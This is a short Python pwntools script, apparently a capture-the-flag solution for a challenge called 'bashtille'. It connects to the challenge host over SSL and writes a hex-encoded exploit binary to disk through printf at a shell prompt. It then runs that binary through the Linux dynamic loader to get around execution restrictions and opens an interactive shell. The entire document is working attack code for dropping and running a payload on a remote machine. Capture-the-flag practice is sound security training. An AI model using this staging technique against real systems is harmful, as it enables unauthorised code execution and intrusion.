from pwn import *

io = remote("bashtille.challs.pwnoh.io", 1337, ssl=True)

io.sendlineafter(b"# ", f"printf '{open('exploit.hex', 'r').read()}' > exploit".encode())
io.sendlineafter(b"# ", b"/lib64/ld-linux-x86-64.so.2 ./exploit")
io.interactive()
